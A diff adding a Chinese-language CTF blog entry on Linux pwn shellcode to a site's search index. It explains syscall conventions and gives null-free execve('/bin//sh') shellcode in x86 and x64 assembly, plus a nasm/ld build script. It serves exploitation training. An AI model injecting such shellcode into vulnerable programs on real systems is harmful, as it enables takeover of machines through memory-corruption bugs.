@@ -1165,4 +1165,55 @@
         <tag>过去</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Linux Pwn - Shellcode</title>
+    <url>/2021/02/25/Linux-Pwn-Shellcode/</url>
+    <content><![CDATA[<p>简易shellcode：使用<code>execve</code>来调用本地shell</p>
+<a id="more"></a>
+
+<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>系统调用相关的指令有：</p>
+<ul>
+<li><code>int 0x80/iret</code><ul>
+<li>软中断</li>
+<li><code>eax</code>为系统调用号，参数依次为<code>ebx</code>、<code>ecx</code>、<code>edx</code>、<code>esi</code>、<code>edi</code> </li>
+</ul>
+</li>
+<li><code>sysenter/sysret</code><ul>
+<li>x86下快速系统调用</li>
+</ul>
+</li>
+<li><code>syscall/sysret</code><ul>
+<li>x64下快速系统调用</li>
+<li><code>rax</code>为系统调用号，参数依次为<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code> </li>
+</ul>
+</li>
+</ul>
+<h2 id="Linux-execve-shellcode"><a href="#Linux-execve-shellcode" class="headerlink" title="Linux execve shellcode"></a>Linux execve shellcode</h2><p>利用<code>execve</code>系统调用可以启动一个新程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EXECVE(2)                                        Linux Programmer<span class="string">&#x27;s Manual                                        EXECVE(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">NAME</span></span><br><span class="line"><span class="string">       execve - execute program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SYNOPSIS</span></span><br><span class="line"><span class="string">       #include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       int execve(const char *filename, char *const argv[],</span></span><br><span class="line"><span class="string">                  char *const envp[]);</span></span><br></pre></td></tr></table></figure>
+<p>在<code>unistd_32.h</code>和<code>unistd_64.h</code>下保存着各个系统调用编号</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unistd_32.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unistd_64.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>需要注意<code>/bin/sh</code>为7个字节，改为<code>/bin//sh</code>为8个字节刚好把<code>\x00</code>给去掉，而linux解析不会出问题，防止<code>NULL</code>截断</p>
+<p>由于字节序的问题，<code>/bin/sh</code>必须要做处理</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; execve(&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;)</span><br><span class="line">    xor eax, eax</span><br><span class="line">    push eax</span><br><span class="line"></span><br><span class="line">    ; ecx -&gt; args, edx -&gt; env &#x3D;&#x3D; NULL</span><br><span class="line">    mul ecx</span><br><span class="line"></span><br><span class="line">    ; push &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">    push 0x68732F2F</span><br><span class="line">    push 0x6E69622F</span><br><span class="line"></span><br><span class="line">    ; ebx -&gt; &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">    mov ebx, esp</span><br><span class="line"></span><br><span class="line">    ; call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>在x64下<code>/bin/sh</code>刚好可以利用传输数据时64位位长来隐式将<code>\x00</code>填上去，不用考虑截断</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; rsi -&gt; args</span><br><span class="line">	xor rsi,rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line"></span><br><span class="line">    ; push &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">	mov rdi,0x68732f6e69622f</span><br><span class="line">	push rdi</span><br><span class="line">	push rsp</span><br><span class="line">    ; rdi -&gt; &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">	pop rdi</span><br><span class="line"></span><br><span class="line">	push 59</span><br><span class="line">	pop rax</span><br><span class="line">	cdq</span><br><span class="line">    ; call execve(&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;)</span><br><span class="line">	syscall</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; GetShellCode.sh</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$2</span> = <span class="string">&quot;-m32&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    nasm -f elf32 <span class="variable">$1</span> -o shellcode.o</span><br><span class="line">    ld -m elf_i386 shellcode.o -o shellcode</span><br><span class="line">    rm -rf shellcode.o</span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$2</span> = <span class="string">&quot;-m64&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    nasm -f elf64 <span class="variable">$1</span> -o shellcode.o</span><br><span class="line">    ld -m elf_x86_64 shellcode.o -o shellcode</span><br><span class="line">    rm -rf shellcode.o</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>二进制安全</tag>
+      </tags>
+  </entry>
 </search>
